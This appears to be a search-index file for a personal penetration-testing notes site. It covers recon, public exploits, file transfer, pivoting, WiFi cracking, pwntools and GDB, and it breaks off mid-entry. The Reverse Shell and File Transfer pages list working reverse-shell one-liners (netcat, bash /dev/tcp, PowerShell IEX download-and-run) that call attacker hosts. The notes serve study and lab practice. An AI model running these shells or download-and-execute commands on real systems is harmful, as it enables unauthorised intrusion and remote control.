load_search_index({"pages":[{"title":"Cybersecurity Note","text":"","tags":"","url":"index.html"},{"title":"Reconnaissance","text":"Reconnaissance tags: Security Recon Table of Contents Reconnaissance tags: Security Recon Reference Workflow Tools Passive Information Gathering Search Engine Google hacking Asset identification Email Harvesting Tools Active Information Gathering DNS enumeration Port Scanning Scan for UDP Fingerprint Scanning Vulnerability Scanning AWS S3 buckets Reference Workflow Recon workflow cheatsheets Tools OWASP Amass: DNS Scraping Certificates APIs Web Archives Passive Information Gathering Search Engine Google hacking Google hacking database Asset identification Shodan Censys Email Harvesting theHarvester: Gathers emails, names, subdomains, IPs, and URLs theharvester -d cisco.com -b google Tools recon-ng whois Sublist3r: Fast subdomains enumeration tool Active Information Gathering @|\u2b50\u6383\u63cf cheat sheet|Hakluke\u2019s Ultimate OSCP Guide DNS enumeration tools - DNSRecon example: brute force reverse zone dnsrecon -n 10.10.10.83 -r 10.0.0.0\/8 --db olympus.db dnsrecon -n 10.10.10.83 -r 172.16.0.0\/12 --db olympus.db dnsrecon -n 10.10.10.83 -r 192.168.0.0\/16 --db olympus.db brute force subdomain tools - knock reverse lookup brute force - \u53cd\u67e5 ip A zone transfer can be requested by specifying a type of AXFR dig axfr @10.10.10.83 olympus.htb DNS Zone Transfer - \u507d\u88dd\u6210 slave DNS # get dns server list host -t ns megacorpone.com | cut -d &quot; &quot; -f 4 # require DNS zone host -l {{domain name}} {{dns server address}} host -l megacorpone.com ns2.megacorpone.com #!\/bin\/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -z &quot;$1&quot; ]; then echo &quot;[*] Simple Zone transfer script&quot; echo &quot;[*] Usage : $0 &lt;domain name&gt; &quot; exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $(host -t ns $1 |cut -d&quot; &quot; -f4);do # For each of these servers, attempt a zone transfer host -l $1 $server |grep &quot;has address&quot; done Port Scanning TCP \u958b\u555f\uff0c\u56de\u8986 SYN-ACK \u5c01\u5305 UDP \u9001\u51fa\u7a7a\u7684 UDP \u5305 \u958b\u555f\uff0c\u6c92\u6709\u56de\u8986 \u95dc\u9589\uff0c\u56de\u8986 ICMP unreachable SNMP - onesixtyone Tools nmap Masccan Scan for UDP nmap -sU 10.11.1.X unicornscan -mU -v -I 10.11.1.X Fingerprint Scanning lbd - Load balancer detector Netcraft [website] Vulnerability Scanning Nmap OpenVAS (Nessus) AWS S3 buckets \u679a\u8209 Bucket Name S3Scanner grayhatwarfare: Public buckets by grayhatwarfare","tags":"","url":"Pentest_Misc_Knowledge\/Reconnaissance.html"},{"title":"Using Public Exploits","text":"Using Public Exploits tags: Security Table of Contents Using Public Exploits tags: Security Searching Exploits Exploit Explanation Using Exploit Tools searchsploit Searching Exploits Exploit Database SecurityFocus Exploit Explanation comics explanation - xkcd Google: heartbleed xkcd Using Exploit for i in $(seq 0 100); do python heartbleed.py valentine.htb; done Tools searchsploit searchsploit -o windows smb -o, --overflow [Term] Exploit titles are allowed to overflow their columns. searchsploit -m 17491 -m, --mirror [EDB-ID] Mirror (aka copies) an exploit to the current working directory.","tags":"","url":"Pentest_Misc_Knowledge\/Using_Public_Exploits.html"},{"title":"Reverse Shell","text":"Reverse Shell tags: Security ReverseShell :::info Table of Contents Reverse Shell tags: Security ReverseShell Move Payload to Target Download from HTTPS Server Spawn Reverse Shell Online Resource Cheat Sheet netcat (really reliable) with ssl bash mknod telnet php powershell Spwning fully interactive TTY Shell Online Resource Overview Steps Cheat Sheet Python perl ruby lua From within IRB From within vi From within nmap Other Tips rlwrap Getting Xterm shell ::: Move Payload to Target Download from HTTPS Server wget --no-check-certificate wildfoo.tw\/reverse_shell -O \/tmp\/s sh \/tmp\/s Spawn Reverse Shell Online Resource 7 linux shells using built in tools Pentestmonkey - Reverse Shell Cheat Sheet Cheat Sheet netcat (really reliable) rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;\/tmp\/f ncat -lk -n -v 7777 with ssl Target: ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl Attacker: ncat -v 10.0.0.22 4444 --ssl bash bash -i &gt;&amp; \/dev\/tcp\/127.0.0.1\/8787 0&gt;&amp;1 exec 5&lt;&gt;\/dev\/tcp\/127.0.0.1\/8787; cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done mknod if GAPING_SECURITY_HOLE = disabled mknod backpipe p &amp;&amp; nc 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash 1&gt;backpipe telnet mknod backpipe p &amp;&amp; telnet 10.10.14.207 7777 0&lt;backpipe | \/bin\/bash php \/usr\/share\/laudanum\/php\/php-reverse-shell.php powershell nishang\/Shells cp \/usr\/share\/nishang\/Shells\/Invoke-PowerShellTcp.ps1 reverse.ps1 vim reverse.ps1 : copy : .EXAMPLE : PS &gt; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444 : to end of file and edit ip and port and delete 'PS &gt; ' python3 -m http.server 80 powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) sometimes we need use \\&quot; to escape Spwning fully interactive TTY Shell Online Resource NETSEC - Spawning TTY Shell cheat sheet Overview \u901a\u5e38\u62ff\u5230\u7684 reverse shell \u6703\u6709\u4e00\u4e9b\u554f\u984c Some commands, like su and ssh require a proper terminal to run STDERR usually isn\u2019t displayed Can\u2019t properly use text editors like vim No tab-complete No up arrow history No job control Upgrading simple shells to fully interactive TTYs Steps use bash ncat -lk -n -v 7777 and get shell type python -c 'import pty; pty.spawn(&quot;\/bin\/bash&quot;)' in reverse shell Ctrl-Z type stty raw -echo fg &lt;enter&gt; &lt;enter&gt; export TERM=xterm allow us use Ctrl-l to clean the screen Cheat Sheet Python python -c 'import pty; pty.spawn(&quot;\/bin\/sh&quot;)' echo os.system('\/bin\/bash') \/bin\/sh -i perl perl -e 'exec &quot;\/bin\/sh&quot;;' exec &quot;\/bin\/sh&quot;; ruby exec &quot;\/bin\/sh&quot; lua os.execute('\/bin\/sh') From within IRB exec &quot;\/bin\/sh&quot; From within vi :!bash :set shell=\/bin\/bash:shell From within nmap !sh Other Tips rlwrap Getting Xterm shell Make sure your Xserver is listening to TCP: $ netstat -lntup Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID tcp 0 0 0.0.0.0:6000 0.0.0.0:* LISTEN - tcp6 0 0 :::6000 :::* LISTEN - New Xserver versions have tcp listening disabled by default. Consult your distro how to enable it. You may have to change your display manager settings or the xserverrc file, e.g.: $ cat \/etc\/X11\/xinit\/xserverrc #!\/bin\/sh if [ -z &quot;$XDG_VTNR&quot; ]; then exec \/usr\/bin\/X -listen tcp &quot;$@&quot; else exec \/usr\/bin\/X -listen tcp &quot;$@&quot; vt$XDG_VTNR fi Then all you have to do is to allow incoming connections from the specific IP: $ xhost +10.10.10.69 Now let\u2019s connect: \/usr\/bin\/xterm -display 10.10.15.203:0 or DISPLAY=10.10.15.203:0 \/usr\/bin\/xterm","tags":"","url":"Pentest_Misc_Knowledge\/Reverse_Shell.html"},{"title":"File Transfer","text":"File Transfers tags: Security Table of Contents File Transfers tags: Security Reference Unix netcat http - put python3 http.server nginx Powershell Invoke-WebRuquest upoad - with put method download run sciprt Reference offsecnewbie Unix netcat Receiver ncat -l -n -v 90 &gt; simpler.py Sender cat simpler.py | nc 10.10.14.207 90 Ctrl-c http - put python3 http.server Sender: upload - with put method curl --upload-file TEST.txt --url http:\/\/192.168.8.9\/TEST.txt --http1.0 Receiver: http.server with put method wget https:\/\/github.com\/WildfootW\/Security-utility-Scripts\/blob\/master\/Network_Protocol\/http.server_with-put.py python3 http.server_with-put.py 80 nginx Receiver server { listen 8001 default_server; server_name wildfootw; location \/ { root \/var\/www\/upload; dav_methods PUT; } } Sender curl --upload-file captured.cap 10.10.14.14:8001 Powershell SANS blog Invoke-WebRuquest upoad - with put method $FilePath = &quot;.\\TEST.txt&quot; $uri = &quot;http:\/\/192.168.8.9\/TEST.txt&quot; Invoke-WebRequest -uri $uri -Method Put -Infile $FilePath -ContentType 'text\/plain' download Invoke-WebRequest -Uri &quot;http:\/\/10.10.14.42\/wmic_info.bat&quot; -OutFile wmic_info.bat run sciprt powershell IEX(New-Object Net.WebClient).downloadstring(&quot;http:\/\/10.10.14.42\/reverse.ps1&quot;) maybe you need use \\&quot; to escape","tags":"","url":"Pentest_Misc_Knowledge\/File_Transfer.html"},{"title":"Pivoting (Port Fun)","text":"Pivoting (Port Fun) tags: Security Pivoting Table of Contents Pivoting (Port Fun) tags: Security Pivoting Reference Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc A:9000 &lt;== ssh ==&gt; C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any temp Reference NETSEC - Dynamic Port Forwarding(SSH) HighOn.Coffee - SSH &amp; Meterpreter Pivoting Techique Example nc &lt;== telnet \/bin\/bash telnet ==&gt; nc Machine A: nc -lk -n -v 7777 Machine B: telnet A.A.A.A 7777 | \/bin\/bash | telnet B.B.B.B 7777 Machine C: nc -lk -n -v 7777 A:9000 &lt;== ssh ==&gt; C:80 Machine A: ssh -i ~\/.ssh\/B.root.key -L9000:C.C.C.C:80 B.B.B.B or ssh B.B.B.B &lt;enter&gt; &lt;enter&gt; ~C ssh&gt; -L 9000:C.C.C.C:80 local:1080 socks5 &lt;== ssh 10.10.10.75 ==&gt; any ssh -D1080 10.10.10.75 netstat -alnp | grep LIST | grep 1080 vim \/etc\/proxychains.conf : [ProxyList] : # add proxy here ... : # meanwile : # defaults set to &quot;tor&quot; : #socks4 127.0.0.1 9050 : # metasploit : #socks4 127.0.0.1 1080 : # ssh : socks5 127.0.0.1 1080 proxychains curl -k https:\/\/10.10.10.60 temp Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 Note: ssh -[L\/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port Note: mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) Is tunnelling possible? Send commands locally, remotely ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig","tags":"","url":"Pentest_Misc_Knowledge\/Pivoting_(Port_Fun).html"},{"title":"Wireless Secuirty","text":"Wireless Security tags: Security Wireless WiFi Table of Contents Wireless Security tags: Security Wireless WiFi Cracking CAP file Using Aircrack-ng Using hashcat Decrypt CAP Cracking CAP file Using Aircrack-ng aircrack-ng captured.cap -w rockyou.txt Using hashcat git clone https:\/\/github.com\/hashcat\/hashcat-utils make .\/cap2hccapx.bin captured.cap captured.hccapx .\/hashcat -m 2500 hashes\/captured.hccapx \/opt\/wordlist\/rockyou.txt Decrypt CAP Wireshark - Preferences - IEEE 802.11 - Decryption Keys - +","tags":"","url":"Pentest_Misc_Knowledge\/Wireless_Secuirty.html"},{"title":"Command Injection & WAF Bypass & Fuzzing","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Command_Injection_WAF_Bypass_Fuzzing.html"},{"title":"Password Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Password_Attacks.html"},{"title":"Client-Side Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Client_Side_Attacks.html"},{"title":"Social Engineering Attacks","text":"","tags":"","url":"Misc_Attack_Vector_Knowledge\/Social_Engineering_Attacks.html"},{"title":"Misc Services","text":"","tags":"","url":"Misc_Service_Attack\/Misc_Services.html"},{"title":"Misc Web CMS","text":"","tags":"","url":"Misc_Service_Attack\/Misc_Web_CMS.html"},{"title":"SMB & SAMBA","text":"","tags":"","url":"Misc_Service_Attack\/SMB_SAMBA.html"},{"title":"SNMP","text":"","tags":"","url":"Misc_Service_Attack\/SNMP.html"},{"title":"SMTP","text":"","tags":"","url":"Misc_Service_Attack\/SMTP.html"},{"title":"Linux","text":"","tags":"","url":"Privilege_Escalation\/Linux.html"},{"title":"Windows","text":"","tags":"","url":"Privilege_Escalation\/Windows.html"},{"title":"Misc","text":"","tags":"","url":"Binary_Exploitation\/Misc.html"},{"title":"Linux-Basic","text":"","tags":"","url":"Binary_Exploitation\/Linux_Basic.html"},{"title":"Linux-Heap","text":"","tags":"","url":"Binary_Exploitation\/Linux_Heap.html"},{"title":"Stack Frame & Calling Convention","text":"","tags":"","url":"Binary_Exploitation\/Stack_Frame_Calling_Convention.html"},{"title":"ELF (Executable and Linkable Format)","text":"","tags":"","url":"Binary_Exploitation\/ELF_(Executable_and_Linkable_Format).html"},{"title":"PE (Portable Executable format)","text":"","tags":"","url":"Binary_Exploitation\/PE_(Portable_Executable_format).html"},{"title":"Linux-FILE Structure","text":"","tags":"","url":"Binary_Exploitation\/Linux_FILE_Structure.html"},{"title":"System Call & Shellcode","text":"","tags":"","url":"Binary_Exploitation\/System_Call_Shellcode.html"},{"title":"Windows-Heap","text":"","tags":"","url":"Binary_Exploitation\/Windows_Heap.html"},{"title":"OSX-Heap","text":"","tags":"","url":"Binary_Exploitation\/OSX_Heap.html"},{"title":"C++","text":"","tags":"","url":"Binary_Exploitation\/C++.html"},{"title":"Tools-Pwntools","text":"Pwntools tags: Security Tools Table of Contents Pwntools tags: Security Tools Installation methods asm p u user interaction pause utils cyclic - Generation of unique sequences cyclic : aaaabaaacaaadaaa Installation sudo apt-get update sudo apt-get install python3 python3-dev python3-pip git libssl-dev libffi-dev sudo pip3 install --upgrade git+https:\/\/github.com\/Gallopsled\/pwntools.git@dev3 sudo pip3 install --upgrade git+https:\/\/github.com\/arthaud\/python3-pwntools.git # no longer support methods asm &gt;&gt;&gt; asm('mov eax, 0') '\\xb8\\x00\\x00\\x00\\x00' &gt;&gt;&gt; asm(shellcraft.nop()) '\\x90' &gt;&gt;&gt; disasm('\\xb8\\x0b\\x00\\x00\\x00') ' 0: b8 0b 00 00 00 mov eax,0xb' p &gt;&gt;&gt; p8(0) '\\x00' &gt;&gt;&gt; p32(0xdeadbeef) '\\xef\\xbe\\xad\\xde' &gt;&gt;&gt; p32(0xdeadbeef, endian='big') '\\xde\\xad\\xbe\\xef' &gt;&gt;&gt; with context.local(endian='big'): p32(0xdeadbeef) '\\xde\\xad\\xbe\\xef' u &gt;&gt;&gt; hex(u32(b&quot;\/bin&quot;)) '0x6e69622f' &gt;&gt;&gt; hex(u64(b&quot;\/\/bin\/sh&quot;)) '0x68732f6e69622f2f' user interaction pause utils cyclic - Generation of unique sequences cyclic(16) 'aaaabaaacaaadaaa' cyclic_find('baaa') 4","tags":"","url":"Binary_Exploitation\/Tools_Pwntools.html"},{"title":"Tools-IDA Pro","text":"IDA Pro tags: Security Tools Shortcut n:\u5e6b\u7269\u4ef6\u53d6\u540d\u5b57 y:\u8a2d\u5b9a\u7269\u4ef6\u7684\u985e\u578b g:\u8df3\u5230\u6307\u5b9a\u4f4d\u5740 x:\u627e reference(\u627e\u51fa\u90a3\u88e1\u7528\u5230\u9019\u500b\u7269\u4ef6) Alt-B:\u627e bytes Shfit-F12:\u5b57\u4e32\u5217\u8868 F5:\u53cd\u7de8\u8b6f","tags":"","url":"Binary_Exploitation\/Tools_IDA_Pro.html"},{"title":"Tools-x64dbg","text":"","tags":"","url":"Binary_Exploitation\/Tools_x64dbg.html"},{"title":"Tools-GNU Debugger","text":"GNU Debugger tags: Security Tools Table of Contents GNU Debugger tags: Security Tools Scenario replace got print return address print memory with a struct print exact address of a variable Cheat Sheet Origin Commands about process attach \/ detach kill follow-fork-mode general r (run) start disass (display assemble) modifier: ni (nexti) \/ si (stepi) n (next) \/ s (step) c (continue) print printf l (list) &lt;if available&gt; display until finish x set commands info info registers [REGISTER] about breakpoint b (break) condition delete rbreak about watch point watch &lt;if available&gt; rwatch awatch about catch point catch about frame frame up down bt (backtrace) about TUI peda angelheap Scenario replace got p &amp;stdout x\/6gx &amp;stdout set stdout as stderr(stdout has been closed) set *(long long*)0x601020 = 0x00007ffff7dd2540 print return address \u53ef\u4ee5\u770b\u5230printf\u7684return address x\/60gx $rsp - 16 print memory with a struct p\/x *(struct link_map*)0x00007ffff7ffe168 print exact address of a variable when gdb is set to C language mode (and Objective-C). p &amp;buf general info address buf Cheat Sheet Help Commands help command Get help on a certain command apropos keyword Search help for a particular keyword Starting and Quitting gdb [-tui] [-c core] [exename] (Unix Command) Start gdb on an executable or standalone; specify \"-tui\" to start the TUI GUI; specify \"-c\" with a corefile name to see where a crash occurred run [arg1] [arg2] [...] Run the currently loaded program with the given command line arguments quit Exit the debugger file exename Load an executable file by name Breakpoints and Watchpoints break location Set a breakpoint at a location, line number, or file (e.g. \"main\", \"5\", or \"hello.c:23\") watch expression Break when a variable is written to rwatch expression Break when a variable is read from awatch expression Break when a variable is written to or read from info break Display breakpoint and watchpoint information and numbers info watch Same as info break clear location Clear a breakpoint from a location delete num Delete a breakpoint or watchpoint by number Stepping and Running next Run to the next line of this function step Step into the function on this line, if possible stepi Step a single assembly instruction continue Keep running from here CTRL-C Stop running, wherever you are finish Run until the end of the current function advance location Advance to a location, line number, or file (e.g. \"somefunction\", \"5\", or \"hello.c:23\") jump location Just like continue, except jump to a particular location first. Examining and Modifying Variables display expression Display the value of a variable or expression every step of the program\u2014the expression must make sense in the current scope info display Show a list of expressions currently being displayed and their numbers undisplay num Stop showing an expression identified by its number (see info display) print expression Print the value of a variable or expression printf&nbsp;formatstr&nbsp;expressionlist Do some formatted output with printf() e.g. printf&nbsp;\"i&nbsp;=&nbsp;%d,&nbsp;p&nbsp;=&nbsp;%s\\n\",&nbsp;i,&nbsp;p set variable expression Set a variable to value, e.g. set&nbsp;variable&nbsp;x=20 set (expression) Works like set variable Window Commands info win Shows current window info focus winname Set focus to a particular window bby name (\"SRC\", \"CMD\", \"ASM\", or \"REG\") or by position (\"next\" or \"prev\") fs Alias for focus layout type Set the window layout (\"src\", \"asm\", \"split\", or \"reg\") tui reg type Set the register window layout (\"general\", \"float\", \"system\", or \"next\") winheight val Set the window height (either an absolute value, or a relative value prefaced with \"+\" or \"-\") wh Alias for winheight set&nbsp;disassembly-flavor&nbsp;flavor Set the look-and-feel of the disassembly. On Intel machines, valid flavors are intel and att Misc Commands RETURN Hit RETURN to repeat the last command backtrace Show the current stack bt Alias for backtrace attach pid Attach to an already-running process by its PID info registers Dump integer registers to screen info all-registers Dump all registers to screen Origin Commands about process $ gdb a.out attach \/ detach $ ps aux (gdb) attach $(Pid) (gdb) detach # release\u7a0b\u5f0f kill kill follow-fork-mode \u4e0d\u6703\u56e0\u70basystem(\u201cecho Hello\u201d)\uff0c\u5bb3gdb\u8df3\u6389 set follow-fork-mode parent set follow-fork-mode child general r (run) start Run debugged program until the beginning of the main procedure. disass (display assemble) modifier: \/m print source &lt;if available&gt; \/r print assemble in hex example: disass main disass \/r main disass 0x400530,0x400550 (start, end) ni (nexti) \/ si (stepi) \u57f7\u884c\u4e00\u884c\u7d44\u5408\u8a9e\u8a00 \u4e0d\u540c\u9ede\u5728\u65bc\u5047\u5982\u9047\u5230call function ni\u6703\u57f7\u884c\u5230function\u7d50\u675f n (next) \/ s (step) \u57f7\u884c\u4e00\u884csource code Execute next program line (step into\/over any function calls in the line) c (continue) \u57f7\u884c\u5230\u4e0b\u4e00\u500bbreakpoint print \u5370\u51fa\u67d0\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c example: (gdb) print x $1 = 0 printf \u4e00\u6b21\u5370\u51fa\u5169\u500b\u4ee5\u4e0a\u7684\u8b8a\u6578 (gdb) print &quot;%d,%d\\n&quot;,x,y 5,2 p password[1]@5 \u5370\u51fapassword[1]\u4e4b\u5f8c5\u500b\u9663\u5217\u88e1\u7684\u503c l (list) &lt;if available&gt; \u986f\u793a\u76ee\u524d\u7a0b\u5f0f\u57f7\u884c\u5230\u90a3\u4e00\u884c display \u5370\u51fa\u67d0\u4e9b\u500b\u8b8a\u6578\u6216 memory address \u7684\u6578\u503c display a \u66ab\u6642\u95dc\u9589 disable display a \u958b\u555f enable display a \u522a\u9664 delete display a until \u57f7\u884c\u5b8c\u7576\u524d\u7684\u8ff4\u5708 until 13 \u4e00\u76f4\u57f7\u884c\u5230\u7b2c13\u884c\u505c\u4e0b\u4f86 finish \u57f7\u884c\u5b8c\u7576\u524d\u7684 function x x[\/FMT] ADDRESS Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left). Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes). example: x \/xw 0x80040000 \u4ee516\u9032\u4f4d\u986f\u793a\u6307\u5b9a\u5730\u5740\u7684\u503c x \/8s 0x86468700 \u986f\u793a\u6307\u5b9a\u5730\u5740\u958b\u59cb\u76848\u4e2a\u5b57\u7b26 x \/50i main \u986f\u793amain\u958b\u982d\u768450\u689d\u6307\u4ee4 x \/10i $pc x \/30gx 0x6020c0-0x10 set set *ADDRESS=VALUE set $ZF = 6 set *0xb6d2a908=0 set *(int *)0xb6daaaec=15 set *(int**)0x8048a548=0x55aa55aa gdb&gt; set *0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00007fff004005a0 gdb&gt; set {uint64_t}0x601030=0x4005a0 gdb&gt; x\/gx 0x601030 0x601030: 0x00000000004005a0 commands (gdb) commands 1 Type commands for breakpoint(s) 1, one per line. End with a line saying just &quot;end&quot;. &gt;print i &gt;print password[i] &gt;continue \u7e7c\u7e8c\u57f7\u884c &gt;end \u8f38\u5165\u5b8c\u6210 info example: info b \u5217\u51fa\u6240\u6709\u8a2d\u5b9a\u904e\u7684 breakpoint info program print\u7a0b\u5f0f\u7684\u72c0\u614b info locals \u5370\u51fa\u6240\u6709\u5340\u57df\u8b8a\u6578\u7684\u503c info registers [REGISTER] info registers \u5bdf\u770b\u6240\u6709\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info registers pc \u5bdf\u770bPC\u66ab\u5b58\u5668\u7684\u503c(\u53ea\u5305\u62ec\u5e38\u7528\u66ab\u5b58\u5668) info all-registers \u67e5\u770b\u6240\u6709\u66ab\u5b58\u5668(\u5305\u62ec\u6d6e\u9ede\u66ab\u5b58\u5668) about breakpoint b (break) break LOCATION [CONDITION] b main Function: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230 main \u9019\u500b function \u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c b *0x00000000004005f0 memory: \u7576\u7a0b\u5f0f\u57f7\u884c\u5230\u9019\u500b\u8a18\u61b6\u9ad4 address (ry break 10 LineNumber break main.c:20 FileName:LineNumber break tcpdump.c:pcap_parse FileName:Function \u52a0\u4e0a\u689d\u4ef6\u5224\u65b7 break 50 if size&gt;0 \u53ea\u5728\u689d\u4ef6\u9054\u6210\u7684\u6642\u5019\u65b7\u9ede condition \u522a\u9664\u65b7\u9ede\u4e0a\u7684\u89f8\u767c\u689d\u4ef6 delete delete 1 \u79fb\u9664\u7b2c\u4e00\u500b breakpoint rbreak rbreak REGEXP rbreak pcap_* \u7d66\u6240\u6709pcap_\u958b\u982d\u7684function\u6dfb\u52a0breakpoint about watch point watch &lt;if available&gt; \u7528\u4f86\u5075\u6e2c\u90a3\u500b\u8b8a\u6578\u7684\u503c\u6709\u88ab\u4fee\u6539\uff0c\u7576\u6307\u5b9a\u7684\u8b8a\u6578\u88ab\u66f4\u6539\u6642\uff0c\u7a0b\u5f0f\u6703\u66ab\u505c\uff0c\u4e26\u5370\u51fa\u66f4\u6539\u524d\u5f8c\u7684\u6578\u503c example: watch str \u89c0\u5bdf\u8b8a\u6578 str watch (t &gt; 10) \u89c0\u5bdf\u8b8a\u6578 t \u662f\u5426\u5927\u65bc 10 rwatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 awatch \u7576\u6307\u5b9a\u8868\u9054\u5f0f\u7684\u503c\u88ab\u8b80\u53d6\/\u66f4\u6539\u4e86,\u5247\u7a0b\u5f0f\u505c\u6b62 about catch point catch catch [EVENT] about frame \u6240\u6709\u7684\u7a0b\u5f0f\uff0c\u6bcf\u4e00\u500b function \u90fd\u6703\u88ab\u5206\u914d\u5230\u4e00\u500b frame \uff0c\u6bcf\u500b frame \u90fd\u662f\u4e00\u500b \u7d44\u8a9e stack \uff0c\u5b58\u653e\u6240\u6709\u7d44\u8a9e\u6307\u4ee4\uff0c\u7136\u5f8c\u518d\u4e00\u884c\u4e00\u884c\u7684\u57f7\u884c\uff0c\u4f8b\u5982\u7576\u7a0b\u5f0f\u57f7\u884c\u5230 printf \u9019\u500b function \u7684\u6642\u5019\uff0c\u5c31\u6703\u9032\u5165\u8a72 printf frame \u3002 \u57f7\u884c\u4e2d\u7684function\u70ba0 \u547c\u53eb0\u7684\u70ba1 \u547c\u53eb1\u7684\u70ba2\u2026 frame \u9032\u5165 frame 1 up \u9032\u5165\u4e0a\u4e00\u500b frame down \u9032\u5165\u4e0b\u4e00\u500b frame bt (backtrace) \u5217\u51fa\u76ee\u524d\u6240\u6709\u7684 frame about TUI Tip: layout reg layout src Standard layout\u2014source on top, command window on the bottom layout asm Just like the &quot;src&quot; layout, except it's an assembly window on top layout split Three windows: source on top, assembly in the middle, and command at the bottom layout reg Opens the register window on top of either source or assembly, whichever was opened last tui reg general Show the general registers tui reg float Show the floating point registers tui reg system Show the &quot;system&quot; registers tui reg next Show the next page of registers\u2014this is important because there might be pages of registers that aren't in the &quot;general&quot;, &quot;float&quot;, or &quot;system&quot; sets peda elfsymbol : show elf .plt section \u67e5\u770bfunction .plt vmmap : show memory mapping \u67e5\u770b process mapping \u53ef\u89c0\u5bdf\u6b0a\u9650 readelf : Get headers information from an ELF file \u67e5\u770b section \u4f4d\u7f6e \u627edata\u6bb5 find\/searchmem : Search for a pattern in memory search memeory \u4e2d\u7684 patten(\u627e\u5b57\u4e32) find \/bin\/sh record : record every instruction at runtime pattc : aaaaaaaabbbbbbbbccccccccddddddddd angelheap heapinfo chunkinfo","tags":"","url":"Binary_Exploitation\/Tools_GNU_Debugger.html"},{"title":"Tools-Immunity Debugger","text":"Immunity Debugger tags: Security Tools F2 set break point attach right click &gt; run as administrator &gt; attach &gt; run &gt; close whole program &gt; repeat function go to address need to use twice plugin mona !mona find -s &quot;\\xff\\xe4&quot; -m slmfc.dll Reset windows tiling stackexchange","tags":"","url":"Binary_Exploitation\/Tools_Immunity_Debugger.html"},{"title":"Misc","text":"","tags":"","url":"Web_Application_Attack\/Misc.html"},{"title":"Information Gathering","text":"","tags":"","url":"Web_Application_Attack\/Information_Gathering.html"},{"title":"Front-end Security","text":"","tags":"","url":"Web_Application_Attack\/Front_end_Security.html"},{"title":"PHP Feature in Security","text":"","tags":"","url":"Web_Application_Attack\/PHP_Feature_in_Security.html"},{"title":"File Upload Vulnerability","text":"","tags":"","url":"Web_Application_Attack\/File_Upload_Vulnerability.html"},{"title":"CRLF Injection","text":"","tags":"","url":"Web_Application_Attack\/CRLF_Injection.html"},{"title":"SQL Injection","text":"","tags":"","url":"Web_Application_Attack\/SQL_Injection.html"},{"title":"XSS (Cross-site Scripting)","text":"","tags":"","url":"Web_Application_Attack\/XSS_(Cross_site_Scripting).html"},{"title":"CSRF (Cross-site Request Forgery)","text":"","tags":"","url":"Web_Application_Attack\/CSRF_(Cross_site_Request_Forgery).html"},{"title":"XXE (XML External Entity)","text":"","tags":"","url":"Web_Application_Attack\/XXE_(XML_External_Entity).html"},{"title":"FLI (Local File Inclusion)","text":"","tags":"","url":"Web_Application_Attack\/FLI_(Local_File_Inclusion).html"},{"title":"SSRF (Server Side Request Forgery)","text":"","tags":"","url":"Web_Application_Attack\/SSRF_(Server_Side_Request_Forgery).html"},{"title":"Deserialization Vulnerability","text":"","tags":"","url":"Web_Application_Attack\/Deserialization_Vulnerability.html"},{"title":"SSTI (Server Side Template Injection)","text":"","tags":"","url":"Web_Application_Attack\/SSTI_(Server_Side_Template_Injection).html"},{"title":"Tools-sqlmap","text":"","tags":"","url":"Web_Application_Attack\/Tools_sqlmap.html"},{"title":"Tools-Burp Suite","text":"","tags":"","url":"Web_Application_Attack\/Tools_Burp_Suite.html"},{"title":"Misc","text":"","tags":"","url":"Crypto\/Misc.html"},{"title":"Classical Cipher","text":"","tags":"","url":"Crypto\/Classical_Cipher.html"},{"title":"Symmetric Encryption","text":"","tags":"","url":"Crypto\/Symmetric_Encryption.html"},{"title":"Asymmetric Cryptography","text":"","tags":"","url":"Crypto\/Asymmetric_Cryptography.html"},{"title":"Hash","text":"","tags":"","url":"Crypto\/Hash.html"},{"title":"Misc","text":"","tags":"","url":"Digital_Forensics\/Misc.html"},{"title":"Mobile Forensics","text":"","tags":"","url":"Digital_Forensics\/Mobile_Forensics.html"},{"title":"Misc","text":"","tags":"","url":"Smart_Contract\/Misc.html"},{"title":"Misc","text":"","tags":"","url":"Attack_And_Defense\/Misc.html"},{"title":"Misc Pentesting 